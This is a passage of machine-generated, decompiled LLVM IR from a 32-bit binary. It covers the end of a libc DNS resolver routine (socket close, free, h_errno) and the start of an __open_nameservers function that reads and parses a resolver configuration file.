  %v3_8053485 = load i32, i32* %v2_8053485, align 4
  %v5_8053485 = zext i32 %v1_8053483 to i64
  %v7_8053485 = zext i32 %v1_8053484 to i64
  %v8_8053485 = mul nuw i64 %v7_8053485, 4294967296
  %v9_8053485 = or i64 %v8_8053485, %v5_8053485
  %v10_8053485 = zext i32 %v3_8053485 to i64
  %v11_8053485 = sdiv i64 %v9_8053485, %v10_8053485
  %v12_8053485 = trunc i64 %v11_8053485 to i32
  store i32 %v12_8053485, i32* %eax.global-to-local, align 4
  %v13_8053485 = srem i64 %v9_8053485, %v10_8053485
  %v14_8053485 = trunc i64 %v13_8053485 to i32
  store i32 %v14_8053485, i32* %edx.global-to-local, align 4
  %v1_805348c = icmp eq i32 %v14_8053485, 0
  store i32 %v14_8053485, i32* %v2_805347f, align 4
  %v1_8053492 = icmp eq i1 %v1_805348c, false
  br i1 %v1_8053492, label %dec_label_pc_8053498, label %dec_label_pc_8053494

dec_label_pc_8053494:                             ; preds = %dec_label_pc_805347f
  %v0_8053494 = load i32, i32* @esp, align 4
  %v1_8053494 = add i32 %v0_8053494, 28
  %v2_8053494 = inttoptr i32 %v1_8053494 to i32*
  %v3_8053494 = load i32, i32* %v2_8053494, align 4
  %v4_8053494 = add i32 %v3_8053494, 1
  store i32 %v4_8053494, i32* %v2_8053494, align 4
  br label %dec_label_pc_8053498

dec_label_pc_8053498:                             ; preds = %dec_label_pc_805347f, %dec_label_pc_8053494
  %v0_8053498 = load i32, i32* @esp, align 4
  %v1_8053498 = add i32 %v0_8053498, 36
  %v2_8053498 = inttoptr i32 %v1_8053498 to i32*
  store i32 -1, i32* %v2_8053498, align 4
  br label %dec_label_pc_80534a0.backedge

dec_label_pc_80534a0.backedge:                    ; preds = %dec_label_pc_8053498, %dec_label_pc_8053479, %dec_label_pc_8053116, %dec_label_pc_8053204
  %v0_80534a0.pre = load i32, i32* @esp, align 4
  %v1_80534a0 = add i32 %v0_80534a0.pre, 28
  %v2_80534a0 = inttoptr i32 %v1_80534a0 to i32*
  %v3_80534a0 = load i32, i32* %v2_80534a0, align 4
  %tmp110 = icmp ult i32 %v3_80534a0, 3
  br i1 %tmp110, label %dec_label_pc_8052f00, label %dec_label_pc_80534c5

dec_label_pc_80534c5:                             ; preds = %dec_label_pc_8052e7a, %dec_label_pc_8052f16, %dec_label_pc_805300a, %dec_label_pc_80534a0.backedge, %entry, %dec_label_pc_8052e54, %dec_label_pc_8052e5c, %dec_label_pc_8052e6a
  %stack_var_-180.0 = phi i16 [ -1, %dec_label_pc_8052e6a ], [ -1, %dec_label_pc_8052e5c ], [ -1, %dec_label_pc_8052e54 ], [ -1, %entry ], [ %v0_8052ec7, %dec_label_pc_80534a0.backedge ], [ %v0_8052ec7, %dec_label_pc_805300a ], [ %v0_8052ec7, %dec_label_pc_8052f16 ], [ %v0_8052ec7, %dec_label_pc_8052e7a ]
  %v0_80534c5 = call i32 @__GI___h_errno_location()
  store i32 %v0_80534c5, i32* %eax.global-to-local, align 4
  %v1_80534ca = inttoptr i32 %v0_80534c5 to i32*
  store i32 -1, i32* %v1_80534ca, align 4
  %v0_80534d0 = load i32, i32* @esp, align 4
  %v1_80534d0 = add i32 %v0_80534d0, 56
  %v2_80534d0 = inttoptr i32 %v1_80534d0 to i32*
  %v3_80534d0 = load i32, i32* %v2_80534d0, align 4
  store i32 %v3_80534d0, i32* %eax.global-to-local, align 4
  %v2_80534d4 = add i32 %v0_80534d0, 44
  %v3_80534d4 = inttoptr i32 %v2_80534d4 to i32*
  store i32 %v3_80534d0, i32* %v3_80534d4, align 4
  br label %dec_label_pc_80534d8

dec_label_pc_80534d8:                             ; preds = %dec_label_pc_805323d, %dec_label_pc_8053215, %dec_label_pc_80534c5
  %stack_var_-180.1 = phi i16 [ %stack_var_-180.0, %dec_label_pc_80534c5 ], [ %v0_8052ec7, %dec_label_pc_805323d ], [ %v0_8052ec7, %dec_label_pc_8053215 ]
  %v0_80534d8 = load i32, i32* @esp, align 4
  %v1_80534d8 = add i32 %v0_80534d8, 20
  %v2_80534d8 = inttoptr i32 %v1_80534d8 to i32*
  %v3_80534d8 = load i32, i32* %v2_80534d8, align 4
  %v13_80534d8 = icmp eq i32 %v3_80534d8, -1
  br i1 %v13_80534d8, label %dec_label_pc_80534d8.dec_label_pc_80534ee_crit_edge, label %dec_label_pc_80534df

dec_label_pc_80534d8.dec_label_pc_80534ee_crit_edge: ; preds = %dec_label_pc_80534d8
  %.pre = sext i16 %stack_var_-180.1 to i32
  br label %dec_label_pc_80534ee

dec_label_pc_80534df:                             ; preds = %dec_label_pc_80534d8
  %v3_80534e2 = load i32, i32* %v2_80534d8, align 4
  %v5_80534e2 = add i32 %v0_80534d8, -16
  %v6_80534e2 = inttoptr i32 %v5_80534e2 to i32*
  store i32 %v3_80534e2, i32* %v6_80534e2, align 4
  %v1_80534e6 = sext i16 %stack_var_-180.1 to i32
  %v2_80534e6 = call i32 @__libc_close(i32 %v1_80534e6)
  store i32 %v2_80534e6, i32* %eax.global-to-local, align 4
  %v0_80534eb = load i32, i32* @esp, align 4
  %v1_80534eb = add i32 %v0_80534eb, 16
  br label %dec_label_pc_80534ee

dec_label_pc_80534ee:                             ; preds = %dec_label_pc_80534d8.dec_label_pc_80534ee_crit_edge, %dec_label_pc_80534df
  %v1_80534f5.pre-phi = phi i32 [ %.pre, %dec_label_pc_80534d8.dec_label_pc_80534ee_crit_edge ], [ %v1_80534e6, %dec_label_pc_80534df ]
  %v0_80534ee = phi i32 [ %v0_80534d8, %dec_label_pc_80534d8.dec_label_pc_80534ee_crit_edge ], [ %v1_80534eb, %dec_label_pc_80534df ]
  %v1_80534f1 = add i32 %v0_80534ee, 12
  %v2_80534f1 = inttoptr i32 %v1_80534f1 to i32*
  %v3_80534f1 = load i32, i32* %v2_80534f1, align 4
  %v5_80534f1 = add i32 %v0_80534ee, -16
  %v6_80534f1 = inttoptr i32 %v5_80534f1 to i32*
  store i32 %v3_80534f1, i32* %v6_80534f1, align 4
  %v2_80534f5 = call i32 @free(i32 %v1_80534f5.pre-phi)
  store i32 %v2_80534f5, i32* %eax.global-to-local, align 4
  %v1_80534fa = load i32, i32* @esp, align 4
  %v2_80534fa = inttoptr i32 %v1_80534fa to i32*
  store i32 %v2_8052e32, i32* %v2_80534fa, align 4
  %v2_80534fd = call i32 @free(i32 %v1_80534f5.pre-phi)
  store i32 %v2_80534fd, i32* @eax, align 4
  %v0_8053502 = load i32, i32* @esp, align 4
  %v1_8053505 = add i32 %v0_8053502, 56
  %v2_8053505 = inttoptr i32 %v1_8053505 to i32*
  %v3_8053505 = load i32, i32* %v2_8053505, align 4
  %v13_8053505 = icmp eq i32 %v3_8053505, -1
  %v1_805350a = add i32 %v0_8053502, 32
  %v2_805350a = inttoptr i32 %v1_805350a to i32*
  store i32 -1, i32* %v2_805350a, align 4
  br i1 %v13_8053505, label %dec_label_pc_80534ee.dec_label_pc_8053561_crit_edge, label %dec_label_pc_8053514

dec_label_pc_80534ee.dec_label_pc_8053561_crit_edge: ; preds = %dec_label_pc_80534ee
  %v0_8053561.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053561

dec_label_pc_8053514:                             ; preds = %dec_label_pc_80534ee
  %v0_8053514 = load i32, i32* @ecx, align 4
  %v1_8053514 = load i32, i32* @esp, align 4
  %v2_8053514 = add i32 %v1_8053514, -4
  %v3_8053514 = inttoptr i32 %v2_8053514 to i32*
  store i32 %v0_8053514, i32* %v3_8053514, align 4
  %v1_8053515 = add i32 %v1_8053514, -8
  %v2_8053515 = inttoptr i32 %v1_8053515 to i32*
  store i32 ptrtoint (i8** @global_var_8060948.241 to i32), i32* %v2_8053515, align 4
  %v1_805351a = add i32 %v1_8053514, -12
  %v2_805351a = inttoptr i32 %v1_805351a to i32*
  store i32 134552291, i32* %v2_805351a, align 4
  %v1_805351f = add i32 %v1_8053514, 184
  store i32 %v1_805351f, i32* %ebx.global-to-local, align 4
  %v2_8053526 = add i32 %v1_8053514, -16
  %v3_8053526 = inttoptr i32 %v2_8053526 to i32*
  store i32 %v1_805351f, i32* %v3_8053526, align 4
  %v3_8053527 = call i32 @__pthread_return_void(i32 %v1_80534f5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053527, i32* %eax.global-to-local, align 4
  %v0_805352c = load i32, i32* @esp, align 4
  %v1_805352c = inttoptr i32 %v0_805352c to i32*
  store i32 ptrtoint (i8** @global_var_8060948.241 to i32), i32* %v1_805352c, align 4
  %v2_8053533 = call i32 @__pthread_return_0(i32 %v1_80534f5.pre-phi)
  store i32 %v2_8053533, i32* %eax.global-to-local, align 4
  %v0_8053538 = load i32, i32* @esp, align 4
  %v1_8053538 = add i32 %v0_8053538, 60
  %v2_8053538 = inttoptr i32 %v1_8053538 to i32*
  %v3_8053538 = load i32, i32* %v2_8053538, align 4
  store i32 %v3_8053538, i32* %eax.global-to-local, align 4
  %v1_805353c = add i32 %v0_8053538, 56
  %v2_805353c = inttoptr i32 %v1_805353c to i32*
  %v3_805353c = load i32, i32* %v2_805353c, align 4
  store i32 %v3_805353c, i32* %edx.global-to-local, align 4
  %v1_8053540 = trunc i32 %v3_8053538 to i16
  store i16 %v1_8053540, i16* @global_var_805a6a4.243, align 4
  %v1_8053546 = inttoptr i32 %v0_8053538 to i32*
  %v2_8053546 = load i32, i32* %v1_8053546, align 4
  store i32 %v2_8053546, i32* @eax, align 4
  %v3_8053546 = add i32 %v0_8053538, 4
  %v1_8053547 = sext i32 %v3_805353c to i64
  store i64 %v1_8053547, i64* @global_var_8060960.242, align 32
  %v1_805354d = inttoptr i32 %v3_8053546 to i32*
  %v2_805354d = load i32, i32* %v1_805354d, align 4
  store i32 %v2_805354d, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_805354d, align 4
  %v0_8053550 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053550, i32* %v1_8053546, align 4
  %v3_8053551 = call i32 @__pthread_return_void(i32 %v1_80534f5.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8053551, i32* %eax.global-to-local, align 4
  %v0_8053556 = load i32, i32* @esp, align 4
  %v1_8053556 = add i32 %v0_8053556, 32
  %v2_8053556 = inttoptr i32 %v1_8053556 to i32*
  store i32 -1, i32* %v2_8053556, align 4
  br label %dec_label_pc_805355e

dec_label_pc_805355e:                             ; preds = %dec_label_pc_80533d2, %dec_label_pc_8053514
  %v0_805355e = load i32, i32* @esp, align 4
  %v1_805355e = add i32 %v0_805355e, 16
  br label %dec_label_pc_8053561

dec_label_pc_8053561:                             ; preds = %dec_label_pc_80534ee.dec_label_pc_8053561_crit_edge, %dec_label_pc_805355e
  %v0_8053561 = phi i32 [ %v0_8053561.pre, %dec_label_pc_80534ee.dec_label_pc_8053561_crit_edge ], [ %v1_805355e, %dec_label_pc_805355e ]
  %v1_8053561 = add i32 %v0_8053561, 16
  %v2_8053561 = inttoptr i32 %v1_8053561 to i32*
  %v3_8053561 = load i32, i32* %v2_8053561, align 4
  store i32 %v3_8053561, i32* %eax.global-to-local, align 4
  %v1_8053565 = add i32 %v0_8053561, 220
  %v1_805356b = inttoptr i32 %v1_8053565 to i32*
  %v2_805356b = load i32, i32* %v1_805356b, align 4
  store i32 %v2_805356b, i32* @ebx, align 4
  %v3_805356b = add i32 %v0_8053561, 224
  %v1_805356c = inttoptr i32 %v3_805356b to i32*
  %v2_805356c = load i32, i32* %v1_805356c, align 4
  store i32 %v2_805356c, i32* @esi, align 4
  %v3_805356c = add i32 %v0_8053561, 228
  %v1_805356d = inttoptr i32 %v3_805356c to i32*
  %v2_805356d = load i32, i32* %v1_805356d, align 4
  store i32 %v2_805356d, i32* @edi, align 4
  %v3_805356d = add i32 %v0_8053561, 232
  %v1_805356e = inttoptr i32 %v3_805356d to i32*
  %v2_805356e = load i32, i32* %v1_805356e, align 4
  store i32 %v2_805356e, i32* @ebp, align 4
  ret i32 %v3_8053561

; uselistorder directives
  uselistorder i32 %v0_8053561, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053538, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80534ee, { 1, 0 }
  uselistorder i32 %v1_80534f5.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_80534a0.pre, { 1, 0 }
  uselistorder i32 %v5_8053473, { 1, 0 }
  uselistorder i32 %v3_8053473, { 2, 0, 1, 3 }
  uselistorder i32 %v1_805343b, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8053404, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80533d2, { 1, 0 }
  uselistorder i32 %v3_80533b1, { 1, 0, 2 }
  uselistorder i32 %v0_80533a2, { 1, 0 }
  uselistorder i32 %v5_8053398, { 1, 0 }
  uselistorder i32* %v3_8053398, { 1, 0 }
  uselistorder i32 %v0_805326e67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8053398, { 2, 1, 0 }
  uselistorder i32 %v5_8053392, { 1, 0 }
  uselistorder i32 %v1_8053391, { 2, 1, 0, 3 }
  uselistorder i32 %v1_805338d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053351, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_805332b, { 1, 0 }
  uselistorder i32 %v1_805331c, { 1, 0 }
  uselistorder i32 %v3_80532ed, { 2, 3, 0, 1 }
  uselistorder i32 %v0_80532db, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8053282, { 1, 2, 0 }
  uselistorder i32 %v0_8053282, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_805325c, { 1, 0 }
  uselistorder i32 %v0_8053264, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8053252, { 1, 0, 2 }
  uselistorder i32 %v5_80531fe, { 1, 0 }
  uselistorder i32* %v2_80531fe, { 1, 0, 2 }
  uselistorder i32 %v3_80531b6, { 1, 2, 0, 3 }
  uselistorder i32 %v0_805319c, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_805317b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_805315b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8053101, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80530e6, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80530cf, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8053057, { 0, 2, 1, 3 }
  uselistorder i32 %v1_805300a, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8052feb, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8052fcf, { 1, 0 }
  uselistorder i32 %v3_8052fc4, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8052fc1, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8052f66, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8052f61, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052f4a, { 1, 0 }
  uselistorder i32 %v1_8052f16, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8052f0783, { 2, 1, 0 }
  uselistorder i16 %v0_8052ec7, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_8052ec0, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_8052e32, { 7, 10, 4, 3, 2, 5, 11, 1, 0, 9, 8, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 14, 15, 16, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ebx.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 78, 79, 80, 81, 82, 83, 84, 85, 72, 87, 88, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 86, 73, 74, 75, 76, 77 }
  uselistorder i16 -1, { 1, 2, 3, 4, 0 }
  uselistorder i32 51, { 7, 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 160, { 0, 3, 1, 2 }
  uselistorder i32 68, { 4, 1, 2, 3, 0 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 100, { 0, 4, 2, 3, 1 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 4, 3, 2, 1, 0 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 4, 5, 12, 11, 10, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 3, 2, 7, 6, 5, 4, 8, 0 }
  uselistorder i32 17, { 12, 9, 5, 8, 2, 3, 1, 0, 13, 4, 11, 10, 6, 7 }
  uselistorder i32 176, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 3, 1, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 0, 2, 3, 1 }
  uselistorder i32 72, { 0, 2, 3, 1, 4 }
  uselistorder i32 84, { 4, 0, 5, 1, 3, 2 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28, 29, 26, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 59, 60, 57, 58 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 26, 21, 24, 22, 25, 27, 28, 23, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32 (i32)* @__libc_close, { 0, 13, 12, 17, 16, 15, 14, 19, 18, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805a6a4.243, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8060960.242, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8060948.241 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8060948.241, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053561, { 1, 0 }
  uselistorder label %dec_label_pc_805355e, { 1, 0 }
  uselistorder label %dec_label_pc_80534ee, { 1, 0 }
  uselistorder label %dec_label_pc_80534d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80534c5, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_80534a0.backedge, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053498, { 1, 0 }
  uselistorder label %dec_label_pc_805347f, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8053434, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80533d2, { 1, 0 }
  uselistorder label %dec_label_pc_80533a2, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8053398, { 1, 0 }
  uselistorder label %dec_label_pc_805338d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805338a, { 1, 0 }
  uselistorder label %dec_label_pc_8053305, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805325c, { 1, 0 }
  uselistorder label %dec_label_pc_80530cf, { 1, 0 }
  uselistorder label %dec_label_pc_8053098, { 1, 0 }
  uselistorder label %dec_label_pc_805300a, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052f16, { 1, 0 }
  uselistorder label %dec_label_pc_8052f00, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8053570 = load i32, i32* @ebp, align 4
  store i32 134552291, i32* %stack_var_-216, align 4
  %v3_805357f = ptrtoint i32* %stack_var_-216 to i32
  %v2_8053584 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053584, i32* @eax, align 4
  %v2_805358c = call i32 @__pthread_return_void(i32 %v2_8053584, i32 134552291)
  %v1_8053598 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a6a8.183 to i32))
  store i32 %v1_8053598, i32* @eax, align 4
  %v0_80535a0 = load i32, i32* @global_var_8060d94.184, align 4
  %tmp41 = icmp slt i32 %v0_80535a0, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8053797, label %dec_label_pc_80535ad

dec_label_pc_80535ad:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_8058610.246 to i32), i32* %stack_var_-216, align 4
  %v2_80535b9 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_80585de.247 to i32), i32 ptrtoint (i32* @global_var_8058610.246 to i32))
  store i32 %v2_80535b9, i32* @eax, align 4
  %v1_80535c1 = icmp eq i32 %v2_80535b9, 0
  store i32 %v2_80535b9, i32* @ebp, align 4
  %v1_80535c5 = icmp eq i1 %v1_80535c1, false
  br i1 %v1_80535c5, label %dec_label_pc_8053762.preheader, label %dec_label_pc_80535cb

dec_label_pc_80535cb:                             ; preds = %dec_label_pc_80535ad
  store i32 ptrtoint (i32* @global_var_8058610.246 to i32), i32* %stack_var_-216, align 4
  %v2_80535d7 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_80585ef.248 to i32), i32 ptrtoint (i32* @global_var_8058610.246 to i32))
  %v1_80535df = icmp eq i32 %v2_80535d7, 0
  store i32 %v2_80535d7, i32* @ebp, align 4
  %v1_80535e3 = icmp eq i1 %v1_80535df, false
  br i1 %v1_80535e3, label %dec_label_pc_8053762.preheader, label %dec_label_pc_805378c

dec_label_pc_8053762.preheader:                   ; preds = %dec_label_pc_80535ad, %dec_label_pc_80535cb
  %v2_8053769 = ptrtoint i32* %stack_var_-180 to i32
  %v3_805369d = add i32 %v3_805357f, 164
  %v4_805368c = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8053762

dec_label_pc_80535ee:                             ; preds = %dec_label_pc_80535f9
  %v1_80535ee = add i32 %v0_80535ee56, 1
  store i32 %v1_80535ee, i32* @ebx, align 4
  %v1_80535ef = inttoptr i32 %v1_80535ee to i8*
  %v2_80535ef = load i8, i8* %v1_80535ef, align 1
  %v3_80535ef = zext i8 %v2_80535ef to i32
  %v5_80535ef = and i32 %v6_80535ef59, -256
  %v6_80535ef = or i32 %v3_80535ef, %v5_80535ef
  store i32 %v6_80535ef, i32* @ecx, align 4
  %v4_80535f1 = icmp eq i8 %v2_80535ef, 0
  br i1 %v4_80535f1, label %dec_label_pc_8053762, label %dec_label_pc_80535f9

dec_label_pc_80535f9:                             ; preds = %dec_label_pc_80535f9.lr.ph, %dec_label_pc_80535ee
  %v6_80535ef59 = phi i32 [ %v6_80535ef53, %dec_label_pc_80535f9.lr.ph ], [ %v6_80535ef, %dec_label_pc_80535ee ]
  %v2_80535ef58 = phi i8 [ %v2_80535ef50, %dec_label_pc_80535f9.lr.ph ], [ %v2_80535ef, %dec_label_pc_80535ee ]
  %v1_80535ef57 = phi i8* [ %v1_80535ef49, %dec_label_pc_80535f9.lr.ph ], [ %v1_80535ef, %dec_label_pc_80535ee ]
  %v0_80535ee56 = phi i32 [ %v0_80535ef.pre, %dec_label_pc_80535f9.lr.ph ], [ %v1_80535ee, %dec_label_pc_80535ee ]
  store i32 %v0_80535f9.pre, i32* @eax, align 4
  %v2_80535fe = sext i8 %v2_80535ef58 to i32
  store i32 %v2_80535fe, i32* @edx, align 4
  %v2_8053601 = mul nsw i32 %v2_80535fe, 2
  %v3_8053601 = add i32 %v0_80535f9.pre, %v2_8053601
  %v4_8053601 = inttoptr i32 %v3_8053601 to i8*
  %v5_8053601 = load i8, i8* %v4_8053601, align 1
  %v6_8053601 = and i8 %v5_8053601, 32
  %v7_8053601 = icmp eq i8 %v6_8053601, 0
  %v1_8053605 = icmp eq i1 %v7_8053601, false
  br i1 %v1_8053605, label %dec_label_pc_80535ee, label %dec_label_pc_8053607

dec_label_pc_8053607:                             ; preds = %dec_label_pc_80535f9
  %v10_8053607 = icmp eq i8 %v2_80535ef58, 10
  br i1 %v10_8053607, label %dec_label_pc_8053762, label %dec_label_pc_8053610

dec_label_pc_8053610:                             ; preds = %dec_label_pc_8053607
  %v10_8053610 = icmp eq i8 %v2_80535ef58, 35
  %v1_805361b = icmp eq i1 %v10_8053610, false
  br i1 %v1_805361b, label %dec_label_pc_805366c.preheader, label %dec_label_pc_8053762

dec_label_pc_805366c.preheader:                   ; preds = %dec_label_pc_8053610
  %v2_805366c6 = load i8, i8* %v1_80535ef57, align 1
  %v3_805366c7 = icmp eq i8 %v2_805366c6, 0
  br i1 %v3_805366c7, label %dec_label_pc_8053678, label %dec_label_pc_8053671

dec_label_pc_8053622:                             ; preds = %dec_label_pc_8053671
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8053626 = load i32, i32* @esp, align 4
  %v3_8053626 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8053626 = add nuw nsw i32 %v3_8053626, 152
  %v5_8053626 = add i32 %v4_8053626, %v1_8053626
  %v6_8053626 = inttoptr i32 %v5_8053626 to i32*
  store i32 %v0_8053626, i32* %v6_8053626, align 4
  %v0_8053630.pre = load i32, i32* @ebx, align 4
  %v4_8053630.pre = load i32, i32* @ecx, align 4
  %v1_805363060 = inttoptr i32 %v0_8053630.pre to i8*
  %v2_805363061 = load i8, i8* %v1_805363060, align 1
  %v3_805363062 = zext i8 %v2_805363061 to i32
  %v5_805363063 = and i32 %v4_8053630.pre, -256
  %v6_805363064 = or i32 %v3_805363062, %v5_805363063
  %v4_805363265 = icmp eq i8 %v2_805363061, 0
  br i1 %v4_805363265, label %dec_label_pc_805364f.preheader, label %dec_label_pc_8053636.lr.ph

dec_label_pc_8053636.lr.ph:                       ; preds = %dec_label_pc_8053622
  %v0_8053636.pre = load i32, i32* @global_var_805a438, align 8
  br label %dec_label_pc_8053636

dec_label_pc_805362f:                             ; preds = %dec_label_pc_8053644
  %v1_805362f = add i32 %v0_805362f67, 1
  store i32 %v1_805362f, i32* @ebx, align 4
  %v1_8053630 = inttoptr i32 %v1_805362f to i8*
  %v2_8053630 = load i8, i8* %v1_8053630, align 1
  %v3_8053630 = zext i8 %v2_8053630 to i32
  %v5_8053630 = and i32 %v6_805363069, -256
  %v6_8053630 = or i32 %v3_8053630, %v5_8053630
  %v4_8053632 = icmp eq i8 %v2_8053630, 0
  br i1 %v4_8053632, label %dec_label_pc_805364f.preheader, label %dec_label_pc_8053636

dec_label_pc_8053636:                             ; preds = %dec_label_pc_8053636.lr.ph, %dec_label_pc_805362f
  %v6_805363069 = phi i32 [ %v6_805363064, %dec_label_pc_8053636.lr.ph ], [ %v6_8053630, %dec_label_pc_805362f ]
  %v2_805363068 = phi i8 [ %v2_805363061, %dec_label_pc_8053636.lr.ph ], [ %v2_8053630, %dec_label_pc_805362f ]
  %v0_805362f67 = phi i32 [ %v0_8053630.pre, %dec_label_pc_8053636.lr.ph ], [ %v1_805362f, %dec_label_pc_805362f ]
  store i32 %v0_8053636.pre, i32* @eax, align 4
  %v2_805363b = sext i8 %v2_805363068 to i32
  store i32 %v2_805363b, i32* @edx, align 4
  %v2_805363e = mul nsw i32 %v2_805363b, 2
  %v3_805363e = add i32 %v0_8053636.pre, %v2_805363e
  %v4_805363e = inttoptr i32 %v3_805363e to i8*
  %v5_805363e = load i8, i8* %v4_805363e, align 1
  %v6_805363e = and i8 %v5_805363e, 32
  %v7_805363e = icmp eq i8 %v6_805363e, 0
  %v1_8053642 = icmp eq i1 %v7_805363e, false
  br i1 %v1_8053642, label %dec_label_pc_805364f.preheader, label %dec_label_pc_8053644

dec_label_pc_8053644:                             ; preds = %dec_label_pc_8053636
  %v10_8053644 = icmp eq i8 %v2_805363068, 10
  %v1_8053647 = icmp eq i1 %v10_8053644, false
